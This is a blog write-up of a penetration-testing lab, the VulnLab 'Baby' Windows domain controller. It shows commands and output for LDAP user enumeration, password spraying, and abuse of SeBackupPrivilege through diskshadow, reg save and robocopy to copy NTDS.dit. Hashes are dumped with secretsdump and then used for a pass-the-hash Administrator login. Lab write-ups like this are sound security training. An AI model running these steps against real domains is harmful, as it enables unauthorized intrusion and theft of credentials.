---
title: "VulnLab Baby"
description: "Hey everyone, welcome back! It’s Mohamed Eletrepy AKA Maverick here with a new write-up — this time for my first machine on VulnLab. It’s a straightforward machine, but as always, you know my style: 1"
pubDate: 2025-02-12
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 11
coverImage: "https://cdn-images-1.medium.com/max/800/1*3Jny_-Ose6Zhv6z25b_MYw.png"
---

---

### VulnLab Baby |SeBackupPrivilege

![](https://cdn-images-1.medium.com/max/800/1*3Jny_-Ose6Zhv6z25b_MYw.png)

First Thing: Free Palestine 🇵🇸

![](https://cdn-images-1.medium.com/max/800/0*xSXCVFxuHctFBbhM.jpeg)

*Free Palestine with every single drop of my blood*

---

Hey everyone, welcome back! It’s Mohamed Eletrepy AKA Maverick here with a new write-up — this time for my first machine on VulnLab. It’s a straightforward machine, but as always, you know my style: 100% real-world scenarios. So, are you ready?

#### Scanning

```bash
┌──(root㉿kali)-[/home/kali/VulnLab]  
└─# nmap -sCV 10.10.83.133 -oN nmap  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 12:31 EET  
Nmap scan report for 10.10.83.133  
Host is up (0.60s latency).  
Not shown: 987 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-10 10:43:18Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)  
3269/tcp open tcpwrapped  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
| ssl-cert: Subject: commonName=BabyDC.baby.vl  
| Not valid before: 2025-02-09T10:40:58  
|_Not valid after: 2025-08-11T10:40:58  
|_ssl-date: 2025-02-10T10:44:33+00:00; +11m07s from scanner time.  
| rdp-ntlm-info:  
| Target_Name: BABY  
| NetBIOS_Domain_Name: BABY  
| NetBIOS_Computer_Name: BABYDC  
| DNS_Domain_Name: baby.vl  
| DNS_Computer_Name: BabyDC.baby.vl  
| Product_Version: 10.0.20348  
|_ System_Time: 2025-02-10T10:43:55+00:00  
5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Service Unavailable  
|_http-server-header: Microsoft-HTTPAPI/2.0  
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
|_clock-skew: mean: 11m06s, deviation: 0s, median: 11m06s  
| smb2-time:  
| date: 2025-02-10T10:43:54  
|_ start_date: N/A  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 131.87 seconds
```

So, we’ve got Kerberos, SMB, and LDAP — pretty juicy, right? 😂 Let’s get started by enumerating each of these services one by one.

### Enumeration

#### SMB

SMB is one of the most versatile services for enumeration, with a variety of powerful tools like `smbmap`, `rpcclient`, `smbclient`, `nmap`, `crackmapexec`, and more. I highly recommend checking out [this](https://0xdf.gitlab.io/cheatsheets/smb-enum#) fantastic cheatsheet by 0xdf for a deeper dive!

At this stage, I usually start by searching for valid users and checking for anonymous login access in SMB. This can reveal shared resources, misconfigurations, or even credentials that might help us move forward.

You can use **Kerbrute**, which leverages the **Kerberos** protocol for user enumeration, or **NetExec**, which uses **SMB** to check for valid accounts with a wordlist.

But without a wordlist, you can still check for anonymous login in SMB using tools like **smbclient**, **smbmap**, or any other enumeration tool. Sometimes, you might get lucky and find some valid users through SMB anonymous login.

In my case, I didn’t find any users this way, so I moved on to **LDAP enumeration**.

#### LDAP

There are plenty of tools for LDAP enumeration, such as **ldapsearch**, **ldeep**, and **NetExec**, but I personally prefer **ldapsearch** because it’s a highly versatile tool. If you’re not familiar with LDAP commands, I suggest watching [this](https://youtu.be/W1Tn_-OExIM?si=dUgOiWf1KxgW-ox9) talk to get a solid understanding!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab]  
└─# ldapsearch -x -b "dc=baby,dc=vl" "user" -H ldap://10.10.83.133 dn  
  
# extended LDIF  
#  
# LDAPv3  
# base <dc=baby,dc=vl> with scope subtree  
# filter: (objectclass=*)  
# requesting: user dn  
#  
  
# baby.vl  
dn: DC=baby,DC=vl  
  
# Administrator, Users, baby.vl  
dn: CN=Administrator,CN=Users,DC=baby,DC=vl  
  
# Guest, Users, baby.vl  
dn: CN=Guest,CN=Users,DC=baby,DC=vl  
  
# krbtgt, Users, baby.vl  
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl  
  
# Domain Computers, Users, baby.vl  
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl  
  
# Domain Controllers, Users, baby.vl  
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl  
  
# Schema Admins, Users, baby.vl  
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl  
  
# Enterprise Admins, Users, baby.vl  
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl  
  
# Cert Publishers, Users, baby.vl  
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl  
  
# Domain Admins, Users, baby.vl  
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl  
  
# Domain Users, Users, baby.vl  
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl  
  
# Domain Guests, Users, baby.vl  
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl  
  
# Group Policy Creator Owners, Users, baby.vl  
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl  
  
# RAS and IAS Servers, Users, baby.vl  
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl  
  
# Allowed RODC Password Replication Group, Users, baby.vl  
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl  
  
# Denied RODC Password Replication Group, Users, baby.vl  
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl  
  
# Read-only Domain Controllers, Users, baby.vl  
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  
  
# Enterprise Read-only Domain Controllers, Users, baby.vl  
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  
  
# Cloneable Domain Controllers, Users, baby.vl  
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl  
  
# Protected Users, Users, baby.vl  
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl  
  
# Key Admins, Users, baby.vl  
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl  
  
# Enterprise Key Admins, Users, baby.vl  
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl  
  
# DnsAdmins, Users, baby.vl  
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl  
  
# DnsUpdateProxy, Users, baby.vl  
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl  
  
# dev, Users, baby.vl  
dn: CN=dev,CN=Users,DC=baby,DC=vl  
  
# Jacqueline Barnett, dev, baby.vl  
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl  
  
# Ashley Webb, dev, baby.vl  
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl  
  
# Hugh George, dev, baby.vl  
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl  
  
# Leonard Dyer, dev, baby.vl  
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl  
  
# Ian Walker, dev, baby.vl  
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl  
  
# it, Users, baby.vl  
dn: CN=it,CN=Users,DC=baby,DC=vl  
  
# Connor Wilkinson, it, baby.vl  
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl  
  
# Joseph Hughes, it, baby.vl  
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl  
  
# Kerry Wilson, it, baby.vl  
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl  
  
# Teresa Bell, it, baby.vl  
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl  
  
# Caroline Robinson, it, baby.vl  
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl  
  
# search reference  
ref: ldap://ForestDnsZones.baby.vl/DC=ForestDnsZones,DC=baby,DC=vl  
  
# search reference  
ref: ldap://DomainDnsZones.baby.vl/DC=DomainDnsZones,DC=baby,DC=vl  
  
# search reference  
ref: ldap://baby.vl/CN=Configuration,DC=baby,DC=vl  
  
# search result  
search: 2  
result: 0 Success  
  
# numResponses: 40  
# numEntries: 36
```

After grepping the users, I saved them into a `users.txt` file for further enumeration.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab]  
└─# cat users.txt  
Guest  
DomainComputers  
CertPublishers  
DomainUsers  
DomainGuests  
GroupPolicyCreatorOwners  
RASandIASServers  
AllowedRODCPasswordReplicationGroup  
DeniedRODCPasswordReplicationGroup  
EnterpriseRead-onlyDomainControllers  
CloneableDomainControllers  
ProtectedUsers  
DnsAdmins  
DnsUpdateProxy  
dev  
Jacqueline.Barnett  
Ashley.Webb  
Hugh.George  
Leonard.Dyer  
it  
Connor.Wilkinson  
Joseph.Hughes  
Kerry.Wilson  
Teresa.Bell  
Caroline.Robinson
```

So, as I mentioned before, now that we have a list of users, let’s check their validity using **NetExec**. Of course, you could use **Kerbrute**, but I’ll stick with **NetExec** for this step.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab]  
└─# nxc smb 10.10.73.200 -u users.txt -p 'BabyStart123!'  
SMB 10.10.73.200 445 BABYDC [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\DomainComputers:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\CertPublishers:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\DomainUsers:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\DomainGuests:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\GroupPolicyCreatorOwners:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\RASandIASServers:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\AllowedRODCPasswordReplicationGroup:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\DeniedRODCPasswordReplicationGroup:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\EnterpriseRead-onlyDomainControllers:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\CloneableDomainControllers:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\ProtectedUsers:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\DnsAdmins:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\DnsUpdateProxy:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\dev:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\it:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE  
SMB 10.10.73.200 445 BABYDC ♟ [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE ♟️♟️♟️  
SMB 10.10.73.200 445 BABYDC [-] baby.vl\:BabyStart123! STATUS_LOGON_FAILURE
```

And here we go! ♟️ We got a valid user, and guess what? The password was sitting right there in the **description field**. This is one of the most common **misconfigurations** and often-overlooked mistakes in **Active Directory enumeration** — something sysadmins frequently forget about!

Alright, let’s put this password to the test with **NetExec** and see if we just struck gold! 🤞🔥

```bash
┌──(root㉿kali)-[/home/kali/VulnLab]  
└─# nxc ldap 10.10.73.200 -u Caroline.Robinson -p 'BabyStart123!'  
SMB 10.10.73.200 445 BABYDC [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.73.200 389 BABYDC [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

And oops… it’s valid! 🤣🤣 Looks like we’re in! But **NetExec** says the password must be changed, which means we **can** change it. So, I’ll use the **smbpasswd** tool to update it and gain access.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab]  
└─# smbpasswd -U Caroline.Robinson -r 10.10.73.200  
Old SMB password:  
New SMB password:  
Retype new SMB password:  
Password changed for user Caroline.Robinson on 10.10.73.200.
```

> Note: When you find a password like this, don’t stop at just one service! Always check its validity across other services like WinRM, LDAP, Kerberos, MSSQL , and more — you never know where it might work! 🔥

Now, I’ll check if the new password works with **WinRM** using **NetExec** and see if we can get a shell!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab]  
└─# nxc smb 10.10.73.200 -u Caroline.Robinson -p 'BabyStart123!#1234'  
SMB 10.10.73.200 445 BABYDC [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  
SMB 10.10.73.200 445 BABYDC [+] baby.vl\Caroline.Robinson:BabyStart123!#1234  
  
┌──(root㉿kali)-[/home/kali/VulnLab]  
└─# nxc winrm 10.10.73.200 -u Caroline.Robinson -p 'BabyStart123!#1234'  
WINRM 10.10.73.200 5985 BABYDC [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 an  
d will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.73.200 5985 BABYDC [+] baby.vl\Caroline.Robinson:BabyStart123!#1234 (Pwn3d!)
```

And here we go! We’re on the Land , bruh! Time to dig deeper!

Now that we’ve got the **user flag**, it’s time to hunt for anything that could escalate us to **Domain Admin** or a higher privilege. This means we need to do some solid enumeration. You can upload tools like **WinPEAS**, **Seatbelt**, or any other utility you prefer to check for privilege escalation paths. Just keep in mind how **verbose** the tool is and its **detection level** — some may trigger alerts in a real-world environment. But since we’re on an **easy machine in a virtual lab**, feel free to go all out and see what you can find!

![](https://cdn-images-1.medium.com/max/800/0*cfVVXWgW_xcujycM.gif)

So first, I just run `whoami /all` to check what permissions and privileges I have on the system.

```powershell
*Evil-WinRM* PS C:\> whoami /all  
  
USER INFORMATION  
----------------  
  
User Name SID  
====================== ==============================================  
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name Type SID Attributes  
========================================== ================ ============================================== ==================================================  
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Backup Operators Alias S-1-5-32-551 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group  
BABY\it Group S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group  
Mandatory Label\High Mandatory Level Label S-1-16-12288  
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name Description State  
============================= ============================== =======  
SeMachineAccountPrivilege Add workstations to domain Enabled  
SeBackupPrivilege Back up files and directories Enabled  
SeRestorePrivilege Restore files and directories Enabled  
SeShutdownPrivilege Shut down the system Enabled  
SeChangeNotifyPrivilege Bypass traverse checking Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
  
  
USER CLAIMS INFORMATION  
-----------------------  
  
User claims unknown.  
  
Kerberos support for Dynamic Access Control on this device has been disabled.
```

So, we have **SeRestorePrivilege** and **SeBackupPrivilege**, which means we can **save the SAM & SYSTEM hives** and download them to our machine for offline extraction. 🔥 Usually, when I have these privileges, I dump everything **SAM, NTDS, SYSTEM, and SECURITY** — to maximize my chances of extracting valuable [credentials](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html?highlight=sam#from-registry).

First, I’ll dump the **SAM** and **SYSTEM** hives, then move on to dumping **NTDS.dit** to extract domain credentials. After that, I’ll download them using **Evil-WinRM** with the `download <filename>` command. Of course, you can use any file transfer method you prefer, like **SMB server, a Python HTTP server**, or any other technique that fits the situation.

```powershell
cd c:\  
mkdir temp  
reg save hklm\sam c:\temp\sam  
reg save hklm\system c:\temp\system
```

### Abusing SeBackupPrivilege to Dump NTDS.dit

According to [*this*](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) awesome blog, you can use **SeBackupPrivilege** to dump **NTDS.dit** and extract domain credentials.

### Steps to Dump NTDS.dit

1. (1)Save the following script as `script.txt`:

```powershell
set metadata C:\Windows\Temp\meta.cabX  
set context clientaccessibleX  
set context persistentX  
begin backupX  
add volume C: alias cdriveX  
createX  
expose %cdrive% E:X  
end backupX
```

1. (2)Run **DiskShadow** with the script:

```text
diskshadow /s script.txt
```

1. (3)Copy **NTDS.dit** to `C:\` using **robocopy**:

```text
robocopy /b E:\Windows\ntds . ntds.dit
```

This method takes advantage of **SeBackupPrivilege** to bypass access restrictions and extract **NTDS.dit** for credential dumping. 🔥

Now it’s time to grab those hashes using secretdump or [pypykatz](https://github.com/skelsec/pypykatz)! But since I’m in love with [Impacket](https://github.com/fortra/impacket), I’ll stick with its awesome tools to get the job done. 🔥❤️

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/temp]  
└─# impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL  
  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Searching for pekList, be patient  
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6  
[*] Reading and decrypting hashes from ntds.dit  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:ee3ecbb84bea0f1ec409c6000c799a8a:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::  
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::  
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::  
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::  
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::  
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::  
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::  
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::  
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::  
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::  
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:4e4c878685747006cad468411f644a15:::  
[*] Kerberos keys from ntds.dit  
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4  
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d  
Administrator:des-cbc-md5:d38cb994ae806b97  
BABYDC$:aes256-cts-hmac-sha1-96:6f76cd9f66873ca06ff7e9a3e6e763e40261d5ce93496263a082307e8ff5fc06  
BABYDC$:aes128-cts-hmac-sha1-96:a2bd132dee3086515d99dffa58659a72  
BABYDC$:des-cbc-md5:1a619e9d34da9170  
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97  
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14  
krbtgt:des-cbc-md5:d57383f1b3130de5  
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084  
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032  
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b  
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039  
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528  
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e  
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258  
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc  
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e  
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd  
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a  
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7  
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784  
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df  
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c  
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e  
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b  
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3  
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41  
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723  
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245  
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb  
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01  
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe  
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84  
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66  
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9  
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:e6ee308b034127c7eb4aed0f035ec56723968112eeeeda29b5b5ad2321cc2b7d  
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:68a17045e6318b75cdf3f9f38b82538c  
baby.vl\Caroline.Robinson:des-cbc-md5:cb6d62cee394297a  
[*] Cleaning up...
```

After validating the hash with **NetExec**, we are **roooooooot**! 🎯 **Checkmate, bruh!** See you soon for the next one! 🚀

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/temp]  
└─# evil-winrm -i 10.10.73.200 -u administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'  
  
Evil-WinRM shell v3.5  
  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
```

![](https://cdn-images-1.medium.com/max/800/0*zcymB7zL96pNjuci.gif)

#### 📌Diagram for the Entire Walkthrough

![](https://cdn-images-1.medium.com/max/800/1*zQzH1J6zwNlcqjEF22B-2g.png)

Another Diagram If you Love Diagrms like me 🥰

![](https://cdn-images-1.medium.com/max/800/1*vMlk75RUPCOJ0Sd25bsRQQ.png)

### Reference

- [Impacket Toolkit](https://github.com/SecureAuthCorp/impacket) — Powerful networking tools for Windows attacks
- [DiskShadow Abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dumping-ntds.dit-using-diskshadow) — Abusing **SeBackupPrivilege** to dump **NTDS.dit**
- [HackTricks — Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology) — Enumeration & privilege escalation techniques
- [Kerberos & SMB Enumeration](https://0xdf.gitlab.io/categories/smb.html) — Cheat sheet for SMB enumeration
- [WinPEAS & Seatbelt](https://github.com/carlospolop/PEASS-ng) — Privilege escalation enumeration tools
- [Abusing SeBackupPrivilege — Juggernaut Security](https://juggernaut-sec.com/sebackupprivilege/#Extracting_a_Copy_of_the_Local_SAM_File_Using_diskshadowexe_and_robocopy) — Detailed guide on extracting **SAM & SYSTEM**
- [Windows Privilege Escalation — SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) — Step-by-step tutorial on exploiting **SeBackupPrivilege**

These resources are a **must-read** for anyone diving into **Active Directory exploitation**!

---

### Do You Wanna Chat with Maverick?🥂

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

By Mohamed Eletreby on February 12, 2025.

Canonical link

Exported from Medium on April 20, 2026.